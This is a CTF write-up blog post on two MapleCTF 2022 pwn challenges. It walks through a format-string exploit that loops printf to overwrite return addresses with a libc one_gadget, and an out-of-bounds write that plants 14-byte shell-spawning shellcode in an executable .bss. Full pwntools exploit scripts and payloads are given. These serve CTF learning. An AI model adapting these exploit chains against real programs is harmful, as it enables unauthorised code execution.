# MapleCTF 2022

> **Source:** Originally published at https://chovid99.github.io/posts/maplectf-2022
> **Author:** Original author (personal blog / CTF team archive)
> **Retrieved:** 2026-07-13
> **Word count:** 6008
> **Images:** 4 embedded locally

---

MapleCTF 2022 - Chovid99's Blog


        **


## Contents


# MapleCTF 2022


            * Aug 29, 2022 * 4582 words 
                * 22 minutes 


                    Contents
                    *


-
-
-
-
-
-
-
-
-
-


During this weekend, I played MapleCTF 2022 with my team `idek`. We managed to secure the 5th position on this CTF. Here is my write-up for some challenges that I solved during the CTF.


# Pwn


## printf


On this challenge, we were given a binary called `chal`.


### Initial Analysis


Let’s start by checking the binary via `checksec`.


```
1
2
3
4
5

```


```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

```


Okay, so the binary is PIE and Full RELRO. Now, let’s try to analyze the binary by disassembling it.


**main


```
1
2
3
4
5
6
7
8
9

```


```
undefined8 main(void)

{
  alarm(0x3c);
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  ready();
  return 0;
}

```


**ready


```
1
2
3
4
5
6

```


```
void ready(void)

{
  set();
  return;
}

```


**set


```
1
2
3
4
5
6

```


```
void set(void)

{
  go();
  return;
}

```


**go


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10

```


```
long go(void)

{
  int iVar1;
  undefined4 extraout_var;

  fgets(s,0x100,stdin);
  iVar1 = printf(s);
  return CONCAT44(extraout_var,iVar1);
}

```


Ah, okay looking at the `go()` method, there is a format string bug. But that’s it, we don’t have any leak (which we need), and yet we were only given one chance to do the format string.


### Exploitation Plan


Let’s start by trying to check the stack just before we call the `printf` method by gdb.


![https://i.imgur.com/QXn5Q5E.png](images/img_1.svg)


We can see some interesting values here. The stack contains a libc address (to be precise `__libc_start_main+243`), and the stack address itself (We can see saved `rbp` of method `go()`, `set()`, and `ready()`).


Our target is to pop a shell with the format string bug, and one `printf` won’t be enough for us. So, the plan is:


- Thinking about how to send our input and call `printf` multiple times, so that we will be more versatile on the exploit

- Try to leak the libc base address, and then calculate the `execve` address (via one_gadget).

- Overwrite one of the saved return pointers to the calculated address, so that it will pop a shell.


### Solution


To execute our plan, let’s try to use `one_gadget` first. I did a little bit of guessing, where based on the previous challenge called `warmup2`, I guessed that the libc version will be the same as my local (Ubuntu 20.04). So let’s try to do `one_gadget` on it.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15

```


```
one_gadget '/usr/lib/x86_64-linux-gnu/libc-2.31.so'
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

```


I’ll use the `0xe3b01` as the offset of our pop shell address, because based on observation in GDB, the r15 and rdx will be null, so it has fulfilled the constraints.


Now, we know that:


- Via format string, we can leak the libc base address

- We have the gadget address of `execve`, which means we know the value that we need to write to one of the saved return pointers


Let’s try to check the stack layout


```
1
2
3
4
5
6
7
8
9

```


```
gef➤  tele
0x007fffffffdbc0│+0x0000: 0x007fffffffdbd0  →  0x007fffffffdbe0  →  0x007fffffffdbf0  →  0x0000000000000000	 ← $rsp, $rbp
0x007fffffffdbc8│+0x0008: 0x005555555551f2  →  <set+18> nop
0x007fffffffdbd0│+0x0010: 0x007fffffffdbe0  →  0x007fffffffdbf0  →  0x0000000000000000
0x007fffffffdbd8│+0x0018: 0x00555555555207  →  <ready+18> nop
0x007fffffffdbe0│+0x0020: 0x007fffffffdbf0  →  0x0000000000000000
0x007fffffffdbe8│+0x0028: 0x0055555555524e  →  <main+68> mov eax, 0x0
0x007fffffffdbf0│+0x0030: 0x0000000000000000
0x007fffffffdbf8│+0x0038: 0x007ffff7ddd083  →  <__libc_start_main+243> mov edi, eax

```


Notice that the stack value in `0x007fffffffdbf8` is already pointing to the libc region. So, it is clear that we can just overwrite the last 3 bytes of the stored value with our calculated gadget address, but to do it, we need a way to repeat the `go()` method multiple times, so that we can overwrite the saved return pointer with our desired value.


The idea is that the saved rbp of `set()`, which is located in the `0x007fffffffdbd0` is pointing to another stack address `0x007fffffffdbe0`. If we’re able to overwrite the value stored in `0x007fffffffdbe0` with our desired address, we will be able to use it as our gadget to overwrite the stored pointer. For example:


- With format string attack, we overwrite the LSB of the value pointed by `0x007fffffffdbd0` with `0xc8`. That means the stored value inside `0x007fffffffdbe0` will be changed from `0x007fffffffdbf0` to `0x007fffffffdbc8`. Now, it points to the saved return pointer of the `go()` method.

- And then using the format string attack again, if we overwrite the LSB of the value pointed by `0x007fffffffdbe0`, that means the value stored inside `0x007fffffffdbc8` will be overwritten, which means we now control our program execution flow.


So, based on the above example, it is clear that the goal of our first format string loop is:


- Overwrite the 8th param **pointed address last byte with `0xc8` (8th param is `0x007fffffffdbd0`, pointing to `0x007fffffffdbe0`, so what we overwrite is the value stored inside `0x007fffffffdbe0`).

- After that, overwrite the 10th param **pointed address last byte with `0xed`(10th param is `0x007fffffffdbe0`, which due to the first payload, is now pointing to the saved return pointer of `go()` :D). Now, the `go()` will return to `set()` and the `set()` will call `go()` again. We successfully create the loop.

- Also, don’t forget to leak the libc address and stack address as well in the first payload.


So, the first loop payload is `%c%c%c%c%c%c%50x%hhn%181x%hhn||%6$p.%7$p.%13$p`. One of the important note is that, if we want to do a chain overwrite like this, we aren’t allowed to use any positional parameter at the beginning of it, because when `printf` see the first positional argument, it will copy the needed arguments to its buffer, so that we won’t be able to do the chain because the next positional argument will refer to the copied buffer, not the overwritten value.


For example, if we’re not spamming `%c`, and instead do it like `%56x%8$n%181x%10$n`, when we try to overwrite the pointed value by the 10th param, it will still refer to the old value (not the overwritten value from the first positional arguments) due to the copy logic.


You must be wondering why we overwrite the 8th param last byte with `0xc8`. Isn’t there an ASLR that always randomizes the stack address? Well, that’s true, but because we only guess the last byte, and the last byte will most likely end with `0x8`, the probability that it is correct is 1:16, which means brute-forcing is very possible.


So, the idea is we need to brute-force it by connecting to the remote server multiple times, with chance 1:16 that the last byte of the stack address which stored the saved return pointer of `go()` method is indeed `0xc8` or any value that we want (Later on my script, I choose `0x38` as my lucky number during guessing the LSB of the stack).


Now that we’re able to trigger the loop, the second format string loop would be used to:


- Overwrite the 10th param last byte with `0xed` again, so that the `go()` will be looped again. Notes that the 10th param is our crafted gadget from the previous loop.

- Overwrite the 6th param **pointed address last byte with `0xf8`, so that the 8th param will point to `0x007fffffffdbf8` instead of `0x007fffffffdbe0`.

- Overwrite the 8th param **pointed address two last bytes with our two last bytes of the calculated win address (8th param is pointing to the saved return pointer of `main()` method which is stored in `0x007fffffffdbf8`).


The second payload will be `%c%c%c%c%100x%hhn%133x%10$hhn%51732x%8$hn`.


Now, on the final loop, the last format string loop would be used to:


- Overwrite the 6th param **pointed address last byte with `0xf8+2`, so that the 8th param will point to `0x007fffffffdbfa` instead of `0x007fffffffdbe0`. We’re trying to overwrite the third last byte.

- Overwrite the 8th param **pointed address last bytes with our third LSB of the calculated win address.


The final payload will be `%c%c%c%c%100x%hhn%133x%10$hhn%51732x%8$hn`. Because we didn’t overwrite the saved return pointer of `go()`, after the `printf` got executed, it will continue the normal flow, and when the `main()` method is returned, it will return to the shell.


Full script


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86

```


```
from pwn import *
from pwn import p64, u64, p32, u32

context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
elf = ELF('./chal')

while True:
    if args.LOCAL:
        r = process(['./chal'], env={})
        if args.PLT_DEBUG:
            gdb.attach(r, gdbscript='''
            b *go+47
            ''')
    else:
        r = remote('printf.ctf.maplebacon.org', 1337)

    # Assuming that the address of the return pointer of go() LSB is 0x38
    # For local testing, turn off ASLR to make it easier to test
    bruteforce_stack_lsb = 0x38

    # The LSB of set() line which do 'CALL go'
    call_go_lsb = 0xed

    # Payload notes:
    # - Overwrite the LSB of saved rbp of ready() to point to the saved return pointer of go()
    # - Overwrite the LSB of saved return pointer of go() to set()+13 (so that it will call go() again)
    # - Also try to leak the pie base, libc base, and LSB of the stack address
    # After executing the payload, if our bruteforced lsb is correct, we will back to the go() function again
    payload = f'%c%c%c%c%c%c%{bruteforce_stack_lsb-6}x%hhn%{call_go_lsb-bruteforce_stack_lsb}x%hhn||%6$p.%7$p.%13$p'.encode()
    print(f'First payload: {payload}')
    r.sendline(payload)
    out = r.recvline().strip().split(b'||')[1].split(b'.')
    stack_addr = int(out[0][-2:], 16)
    leaked_pie = int(out[1], 16)
    leaked_libc = int(out[2], 16)
    log.info(f'Leaked pie : {hex(leaked_pie)}')
    log.info(f'Leaked libc: {hex(leaked_libc)}')
    log.info(f'Stack addr : {hex(stack_addr)}')

    if stack_addr != 0x40:
        # Re-init connection
        r.close()
        continue

    elf.address = leaked_pie - elf.symbols['set'] - 18
    libc.address = leaked_libc - libc.symbols['__libc_start_main'] - 243
    log.info(f'Pie base   : {hex(elf.address)}')
    log.info(f'Libc base  : {hex(libc.address)}')
    win_addr = libc.address + 0xe3b01 # rdx and r15 null via one_gadget
    log.info(f'Libc win  : {hex(win_addr)}')

    # Second loop payload notes:
    # From the first loop, we already have gadget to overwrite the saved return pointer of go(), stored inside
    # the saved rbp of the ready() function.
    # Now, the detail of the payload:
    # - Overwrite the LSB of saved rbp of set() the LSB of the stack address of the saved return pointer of main()
    # - Overwrite the LSB of saved return pointer of go() to set()+13 with our crafter gadget from the first loop
    # - Overwrite first and second LSB of saved return pointer of main() to our win address (shell via one_gadget)
    total = 4
    s1 = stack_addr+0x28 - total
    total += s1
    s2 = 0xed - total
    total += s2
    s3 = (win_addr % 0x10000)-total
    payload = f'%c%c%c%c%{s1}x%hhn%{s2}x%10$hhn%{s3}x%8$hn'.encode()
    print(f'Second payload: {payload}')
    r.sendline(payload)

    # Third loop notes:
    # - Overwrite the LSB of saved rbp of set() to point to the saved return pointer of main() + 2 (Because we have overwritten two bytes)
    # - Overwrite the third LSB of saved return pointer of main() with the third LSB of our shell address
    # Now the main() will ret to shell
    total = 4
    s1 = stack_addr+0x28+2-total
    total += s1
    s2 = ((win_addr// 0x10000) % 0x100)-total
    print(hex(((win_addr// 0x10000) % 0x100)))
    payload = f'%c%c%c%c%{s1}x%hhn%{s2}x%8$hhn'.encode()
    print(f'Third payload: {payload}')
    r.sendline(payload)
    r.interactive()

```


![https://i.imgur.com/SCFsZzE.png](images/img_2.svg)

>


`Flag: maple{F0wm47_57w1ng_3xpl01t_UwU}`


## Puzzling Oversight


We were given a binary called `puzzling-oversight` and a `Dockerfile`. Reading through the `Dockerfile`, the challenge was running under Ubuntu 22.04.


### Initial Analysis


Let’s start by `checksec` the binary first.


```
1
2
3
4
5
6

```


```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RWX:      Has RWX segments

```


Hmm RWX segments? Let’s try to run the binary in gdb and check its memory.


```
1
2
3
4
5
6
7
8

```


```
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00555f0e89f000 0x00555f0e8a0000 0x00000000000000 r-- /home/chovid99/ctf/puzzling/puzzling-oversight
0x00555f0e8a0000 0x00555f0e8a1000 0x00000000001000 r-x /home/chovid99/ctf/puzzling/puzzling-oversight
0x00555f0e8a1000 0x00555f0e8a2000 0x00000000002000 r-- /home/chovid99/ctf/puzzling/puzzling-oversight
0x00555f0e8a2000 0x00555f0e8a3000 0x00000000002000 r-- /home/chovid99/ctf/puzzling/puzzling-oversight
0x00555f0e8a3000 0x00555f0e8a4000 0x00000000003000 rwx /home/chovid99/ctf/puzzling/puzzling-oversight

```


Ah, turn out the `.bss` is executable.


Let’s try to run the given binary first so that we gain some knowledge about it.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40

```


```
./puzzling-oversight
Welcome to the Number Flipper(TM) game v7.27!

Options:
1 - play the game
2 - display how to play this game
3 - display game stats
4 - quit

> 2

How to play this game:
You are given 8 random hexadecimal numbers, which you can increment by any amount (it will wrap around if it's too big);
However, the catch is doing so also affects the numbers directly next to it!
Your goal is to flip all the numbers to 0s.
That's it - simple, right?

Options:
1 - play the game
2 - display how to play this game
3 - display game stats
4 - quit

> 3

You have won 0 times in the current session. Keep going!

Options:
1 - play the game
2 - display how to play this game
3 - display game stats
4 - quit

> 1

Board: 4b40 6451 55f4 d4f4 3c8f d13f 76f4 a891
Your move (0 to quit) > 3
Increment how much? > 1
Board: 4b40 6452 55f5 d4f5 3c8f d13f 76f4 a891
Your move (0 to quit) > 0

```


Seeing through the interaction, the first menu is the only menu that can we use to write something to the memory. The rest isn’t useful. And based on the printed rules, we can see that:


- Each time we choose an index called `idx` to be incremented, the value stored in `idx-1` and `idx+1` will be incremented also.

- Seems like, the maximum value per index is `0xffff`, and it will wrap around when the value gets bigger than that.


Let’s start disassembling the binary. The binary method was stripped, but I’ve renamed it to make it clearer.


**main


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29

```


```
void main(void)

{
  int iVar1;

  alarm(0x3c);
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  _DAT_00104060 = menu_play;
  _DAT_00104068 = menu_rule;
  _DAT_00104070 = menu_stats;
  _DAT_00104078 = menu_quit;
  puts("Welcome to the Number Flipper(TM) game v7.27!\n");
  do {
    do {
      puts("Options:");
      puts("1 - play the game");
      puts("2 - display how to play this game");
      puts("3 - display game stats");
      puts("4 - quit\n");
      printf("> ");
      fflush(stdout);
      iVar1 = read_input(1,4);
    } while ((long)iVar1 == -1);
    putchar(10);
    (**(code **)(&DAT_00104060 + ((long)iVar1 + -1) * 8))();
    putchar(10);
  } while( true );
}

```


From the main menu, notice that:


- Each of the menu function handler’s pointers is stored under the `.bss` section

- During each input in the main menu, the `main` will call the stored pointer inside the `.bss` variables based on the input.


We just need to check the first menu, because it’s the only important menu that needs to be audited.


**main_play


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47

```


```
void menu_play(void)

{
  int iVar1;
  time_t tVar2;
  long lVar3;
  int local_38;
  int local_34;

  tVar2 = time((time_t *)0x0);
  srand((uint)tVar2);
  local_38 = 4;
  while (local_38 != 0) {
    iVar1 = rand();
    (&DAT_00104050)[local_38 + -1] = iVar1;
    local_38 = local_38 + -1;
  }
  while ((((DAT_00104050 != 0 || (DAT_00104054 != 0)) || (DAT_00104058 != 0)) || (DAT_0010405c != 0)
         )) {
    printf("Board: ");
    local_34 = 8;
    while (local_34 != 0) {
      printf("%04x ",(ulong)*(ushort *)((long)&DAT_00104050 + (long)(local_34 + -1) * 2));
      local_34 = local_34 + -1;
    }
    printf("\nYour move (0 to quit) > ");
    fflush(stdout);
    iVar1 = read_input(0);
    lVar3 = (long)iVar1;
    if (lVar3 != -1) {
      if (lVar3 == 0) {
        return;
      }
      printf("Increment how much? > ");
      fflush(stdout);
      iVar1 = read_input(1);
      if (iVar1 != -1) {
        for (local_34 = (int)-lVar3 + 7; (long)local_34 <= -lVar3 + 9; local_34 = local_34 + 1) {
          *(short *)((long)&DAT_00104050 + (long)local_34 * 2) =
               *(short *)((long)&DAT_00104050 + (long)local_34 * 2) + (short)iVar1;
        }
      }
    }
  }
  printf("Congrats! You solved it!");
  DAT_00104040 = DAT_00104040 + 1;
  return;

```


At first, I didn’t see any bugs in here. But one of my teammates (Kudos to `daeMOn`) told me that there is a bug in this method. Let’s check this LOC:


```
1
2
3
4

```


```
        for (local_34 = (int)-lVar3 + 7; (long)local_34 <= -lVar3 + 9; local_34 = local_34 + 1) {
          *(short *)((long)&DAT_00104050 + (long)local_34 * 2) =
               *(short *)((long)&DAT_00104050 + (long)local_34 * 2) + (short)iVar1;
        }

```


There is an out-of-bound bug (OOB) due to an improper check. Notice that `lVar3` is our index input, and if we input `1` or `8` as the index, it will modify `DAT_00104050+(8*2)` and `DAT_00104050-(1*2)` also. The size of the board is only 16 bytes, yet the program allowed it to overwrite OOB memories. Let’s check what kind of data can be overwritten due to this.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12

```


```
gef➤  x/22gx 0x555f0e8a3040
0x555f0e8a3040: 0x0000000000000000      0x0100000000000000
0x555f0e8a3050: 0x106d530b1473264c      0x461931b55055da14
0x555f0e8a3060: 0x0000555f0e8a63a2      0x0000555f0e8a65b5
0x555f0e8a3070: 0x0000555f0e8a660b      0x0000555f0e8a66a0
0x555f0e8a3080: 0x0000000000000000      0x0000000000000000
0x555f0e8a3090: 0x0000000000000000      0x0000000000000000
0x555f0e8a30a0: 0x0000000000000000      0x0000000000000000
0x555f0e8a30b0: 0x0000000000000000      0x0000000000000000
0x555f0e8a30c0: 0x0000000000000000      0x0000000000000000
0x555f0e8a30d0: 0x0000000000000000      0x0000000000000000
0x555f0e8a30e0: 0x0000000000000000      0x0000000000000000

```


Well, turn out we can overwrite the last 4 bytes of the `menu_play` address by incrementing the index `1`.


### Exploitation Plan


From our initial analysis, the important notes that we took:


- `.bss` is RWX

- We can freely control the board value via the increment method

- And somehow, there is a bug in the board value’s assignment, which allowed us to replace the last 4 bytes of the `menu_play` method.


So, the idea for solving this challenge is we need to somehow control the increment so that two conditions will be fulfilled, which are:


- Change the board value to our desired shellcode

- Change the stored `menu_play` pointer to the board address (Because it is RWX), so that if we call `menu_play`, it will run our desired shellcode


If the above conditions are fulfilled, the next time we try to call the `menu_play`’s method for the board’s game, it will give us a shell instead.


### Solution


First, we need to solve the puzzle. We need to create a script to determine the correct increment on each index so that the board address will contain our desired value. How to create the script?


Well, just use z3 to do it xD. Luckily, during the competition, my teammate daeMOn was sharing his script to complete the z3 logic. Let’s say that our target value is `1337 beef 1337 beef 1337 beef 1337 beef`, and the initial value is `beef 1337 beef 1337 beef 1337 beef 1337`. We can convert this to z3 equations, where:


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38

```


```
    # Below is the total increment on each index that we want to find
    x1 = BitVec('x1', 16)
    x2 = BitVec('x2', 16)
    x3 = BitVec('x3', 16)
    x4 = BitVec('x4', 16)
    x5 = BitVec('x5', 16)
    x6 = BitVec('x6', 16)
    x7 = BitVec('x7', 16)

    # Below is the initial state
    a = BitVecVal(int(numbers[1], 16), 16)
    b = BitVecVal(int(numbers[2], 16), 16)
    c = BitVecVal(int(numbers[3], 16), 16)
    d = BitVecVal(int(numbers[4], 16), 16)
    e = BitVecVal(int(numbers[5], 16), 16)
    f = BitVecVal(int(numbers[6], 16), 16)
    g = BitVecVal(int(numbers[7], 16), 16)

    # Below is the target state that we want
    target_7 = BitVecVal(int.from_bytes(payload[:2], "little"), 16)
    target_6 = BitVecVal(int.from_bytes(payload[2:4], "little"), 16)
    target_5 = BitVecVal(int.from_bytes(payload[4:6], "little"), 16)
    target_4 = BitVecVal(int.from_bytes(payload[6:8], "little"), 16)
    target_3 = BitVecVal(int.from_bytes(payload[8:10], "little"), 16)
    target_2 = BitVecVal(int.from_bytes(payload[10:12], "little"), 16)
    target_1 = BitVecVal(int.from_bytes(payload[12:14], "little"), 16)

    # Below is the constraints that we pass to the z3
    # Notes that below is the z3 equations that we derive from the game's rule
    s.add(
        a + x1 + x2 == target_1,
        b + x1 + x2 + x3 == target_2,
        c + x2 + x3 + x4 == target_3,
        d + x3 + x4 + x5 == target_4,
        e + x4 + x5 + x6 == target_5,
        f + x5 + x6 + x7 == target_6,
        g + x6 + x7 == target_7,
    )

```


Notice that even though the max index is 8, we can only have 7 in the z3, which means the max desired value size is 14 bytes. The z3 couldn’t solve the equations if we try to set the target state to 16 bytes, so we concluded that the limit is 14 bytes (where it’s always `sat`).


To execute our plan, first, we will need to craft 14-bytes shellcode. The constraint is pretty short and seems impossible, but luckily during debugging with GDB, I found some good values.


First, I was checking the register value right after we do `call rdx` (which is calling the stored `main_play` address).


![https://i.imgur.com/9jZAtL7.png](images/img_3.svg)


Notice that:


- `rbx` is 0

- `rcx` contains `libc` address

- `rdx` and `rsi` isn’t zero yet


We’ve already had a `libc` address in our register for our shellcode. This will help us a lot. But first, let’s try to find out which `libc` is used by the challenge.


How to get the `libc`? Because we have the `Dockerfile`, we can simply build it and take the `libc.so.6` file from `/usr/lib/x86_64-linux-gnu/`. Now, let’s use one_gadget to the retrieved `libc`, to find the shell address and rules to be followed. Below is the result:


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24

```


```
one_gadget /usr/lib/x86_64-linux-gnu/libc.so.6
0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbp == NULL || (u16)[rbp] == NULL

0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

```


With this, we hoped that jumping to the given gadget can be fitted into the 14-bytes space.


Let’s start crafting our shellcode by incrementing/subtracting the stored `rcx` so that it points to the one_gadget’s result. We use the third gadget (`0xebcf8`) because using `rsi` or `rdx` will decrease the shellcode’s size.


```
1

```


```
    sub rcx, 0x28d3f

```


The above line will need 7 bytes, so we can only have 7 bytes more to complete the gadget call. Now we have a register with our desired jump address, we need to fulfill the constraints given by one_gadget, which are:


- rsi == NULL

- rdx == NULL


Checking through the gdb, the constraints weren’t fulfilled yet. Usually, we will use `xor rsi, rsi` to nullify a register, but it needs 3 bytes to do that. We know that `rbx` is 0, we can simply use this to produce two bytes shellcode that can nullify the `rsi` and `rdx`.


```
1
2
3
4
5

```


```
    sub rcx, 0x28d3f
    push rbx
    pop rsi
    push rbx
    pop rdx

```


Our current shellcode size is 11 bytes, so there are only 3 bytes more that we can squeeze into the payload. Now that our constraints have been fulfilled, we only need to complete the shellcode, by adding `jmp rcx`, so that we will gain a shell. The final shellcode is:


```
1
2
3
4
5
6
7

```


```
    sub rcx, 0x28d3f
    push rbx
    pop rsi
    push rbx
    pop rdx
    jmp rcx
    nop

```


The total shellcode is 13 bytes, and I add extra nop just to round it to 14 bytes.


Now that we already have a working shellcode, now it’s time for us to solve the puzzle so that the `.bss` sections will contain our shellcode.


Below is the full script


```
  1
  2
  3
  4
  5
  6
  7
  8
  9
 10
 11
 12
 13
 14
 15
 16
 17
 18
 19
 20
 21
 22
 23
 24
 25
 26
 27
 28
 29
 30
 31
 32
 33
 34
 35
 36
 37
 38
 39
 40
 41
 42
 43
 44
 45
 46
 47
 48
 49
 50
 51
 52
 53
 54
 55
 56
 57
 58
 59
 60
 61
 62
 63
 64
 65
 66
 67
 68
 69
 70
 71
 72
 73
 74
 75
 76
 77
 78
 79
 80
 81
 82
 83
 84
 85
 86
 87
 88
 89
 90
 91
 92
 93
 94
 95
 96
 97
 98
 99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122

```


```
# Credit to my teammate, daeMOn who create this z3 solver script.
# I helped him by crafting the 14-bytes shellcode.
from pwn import *
from z3 import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('puzzling-oversight')
context.terminal = ['alacritty', '-e', 'bash', '-c']

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        gdbscript = '''
        set disable-randomization on
        continue
        '''.format(**locals())
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return remote('puzzling-oversight.ctf.maplebacon.org', 1337)

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RWX:      Has RWX segments

def z3_solve(numbers, payload):
    s = Solver()

    x1 = BitVec('x1', 16)
    x2 = BitVec('x2', 16)
    x3 = BitVec('x3', 16)
    x4 = BitVec('x4', 16)
    x5 = BitVec('x5', 16)
    x6 = BitVec('x6', 16)
    x7 = BitVec('x7', 16)

    a = BitVecVal(int(numbers[1], 16), 16)
    b = BitVecVal(int(numbers[2], 16), 16)
    c = BitVecVal(int(numbers[3], 16), 16)
    d = BitVecVal(int(numbers[4], 16), 16)
    e = BitVecVal(int(numbers[5], 16), 16)
    f = BitVecVal(int(numbers[6], 16), 16)
    g = BitVecVal(int(numbers[7], 16), 16)

    target_7 = BitVecVal(int.from_bytes(payload[:2], "little"), 16)
    target_6 = BitVecVal(int.from_bytes(payload[2:4], "little"), 16)
    target_5 = BitVecVal(int.from_bytes(payload[4:6], "little"), 16)
    target_4 = BitVecVal(int.from_bytes(payload[6:8], "little"), 16)
    target_3 = BitVecVal(int.from_bytes(payload[8:10], "little"), 16)
    target_2 = BitVecVal(int.from_bytes(payload[10:12], "little"), 16)
    target_1 = BitVecVal(int.from_bytes(payload[12:14], "little"), 16)

    s.add(
        a + x1 + x2 == target_1,
        b + x1 + x2 + x3 == target_2,
        c + x2 + x3 + x4 == target_3,
        d + x3 + x4 + x5 == target_4,
        e + x4 + x5 + x6 == target_5,
        f + x5 + x6 + x7 == target_6,
        g + x6 + x7 == target_7,
    )
    print(s)

    s_check_output = s.check()
    if s_check_output == sat:
        ans = s.model()
        return [
            ans.evaluate(x1).as_long(),
            ans.evaluate(x2).as_long(),
            ans.evaluate(x3).as_long(),
            ans.evaluate(x4).as_long(),
            ans.evaluate(x5).as_long(),
            ans.evaluate(x6).as_long(),
            ans.evaluate(x7).as_long(),
        ]
    else:
        print("no solution :(")


io = start()

io.sendlineafter(b"> ", b"1")


bss_offset = 0x8050
play_offset = 0x53a2

diff = bss_offset-play_offset

io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"> ", str(diff).encode("utf-8"))

board = io.recvuntil(b"Board: ")
board = io.recvline(keepends=False)
numbers = board.strip(b" ").split(b" ")


shellcode = asm('''
    sub rcx, 0x28d3f
    push rbx
    pop rsi
    push rbx
    pop rdx
    jmp rcx
    nop
''')
print(shellcode.hex(), len(shellcode))

increment_numbers = z3_solve(numbers, shellcode)
for i, num in enumerate(increment_numbers):
    if num == 0:
        continue
    io.sendlineafter(b"> ", str(i+2).encode("utf-8"))
    io.sendlineafter(b"> ", str(num).encode("utf-8"))

# trigger
io.sendlineafter(b"> ", b"0") # quit
io.sendlineafter(b"> ", b"1") # play

io.interactive()

```


And now, we ran the script and got the flag!
![https://i.imgur.com/ey5GH5n.png](images/img_4.svg)

>


`Flag: maple{1s_th3_puzzl3_3v3n_s0lv4ble_4ctu4lly}`


# Social Media


Follow me on twitter


                Share on**


        * Writeup, MapleCTF, Pwn, Format String, Shellcode


    *Google CTF 2022
            *BlackHat MEA CTF 2022


            *

        **
